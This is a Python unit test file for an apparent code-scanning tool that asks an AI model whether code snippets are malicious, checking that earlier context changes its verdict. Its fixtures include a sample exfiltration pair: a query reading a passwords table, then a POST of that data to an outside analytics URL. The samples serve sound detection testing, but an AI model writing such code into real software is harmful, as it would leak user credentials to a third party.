import unittest
import os
import sys
from unittest.mock import patch, MagicMock

# Add root directory to python path

# We need to mock the google.genai and dotenv imports if they are not installed in the test environment,
# just in case, but since we are unit testing the logic, we will definitely mock the API call itself.
try:
    from lobster.core import scan_packet
except ImportError:
    # If imports fail due to missing dotenv/google (like in our previous run), we apply the same safe mock
    sys.modules['dotenv'] = type('dummy', (), {'load_dotenv': lambda: None})
    import types
    google_mod = types.ModuleType('google')
    genai_mod = types.ModuleType('genai')
    genai_mod.Client = lambda **kwargs: MagicMock()
    google_mod.genai = genai_mod
    sys.modules['google'] = google_mod
    sys.modules['google.genai'] = genai_mod
    from lobster.core import scan_packet

class TestContextAwareDetection(unittest.TestCase):
    
    def setUp(self):
        from lobster.core import RUNTIME_CACHE, limiter
        RUNTIME_CACHE.clear()
        limiter.tokens = limiter.rate

    @patch('lobster.core.client')
    def test_context_aware_attack_detection(self, mock_client):
        # We need to test that providing context history successfully influences the AI's decision.
        # We will mock the AI to behave exactly as a trained security model would.
        
        # Setup the mock API response for a BLOCKED verdict due to context
        mock_response = MagicMock()
        mock_response.text = "REASONING: Malicious exfiltration attempt utilizing previously established environment variable."
        mock_client.models.generate_content.return_value = mock_response
        
        # Packet 1 sets the context: extracting sensitive data
        context_history = [
            {"code_snippet": 'user_data = db.query("SELECT * FROM passwords")'}
        ]
        
        # Packet 2 is the actual payload: exfiltrating it via a standard looking request
        packet = {"code_snippet": 'requests.post("http://analytics.com/log", json={"data": user_data})'}
        
        result = scan_packet(packet, context_history=context_history, use_llm=True)
        
        self.assertEqual(result["status"], "BLOCKED")
        self.assertEqual(result["source"], "GEMINI_API")
        self.assertIn("Malicious exfiltration", result["analysis"])
        
        # Verify that the history was actually passed to the API in the prompt
        args, kwargs = mock_client.models.generate_content.call_args
        prompt_used = kwargs.get('contents', '')
        
        self.assertIn("SELECT * FROM passwords", prompt_used)
        self.assertIn("PREVIOUS CONTEXT", prompt_used)
        
    @patch('lobster.core.client')
    def test_benign_packet_in_isolation(self, mock_client):
        # Ensure that the same packet without the malicious context is allowed
        # Setup the mock API response for a CLEAN verdict
        mock_response = MagicMock()
        mock_response.text = "REASONING: Standard analytics logging request, benign in isolation."
        mock_client.models.generate_content.return_value = mock_response
        
        # No context history
        packet = {"code_snippet": 'requests.post("http://analytics.com/log", json={"data": user_data})'}
        
        result = scan_packet(packet, context_history=None, use_llm=True)
        
        self.assertEqual(result["status"], "CLEAN")
        self.assertEqual(result["source"], "GEMINI_API")
        
        # Verify that NO context was passed to the API in the prompt
        args, kwargs = mock_client.models.generate_content.call_args
        prompt_used = kwargs.get('contents', '')
        
        self.assertNotIn("PREVIOUS CONTEXT", prompt_used)

if __name__ == '__main__':
    unittest.main()
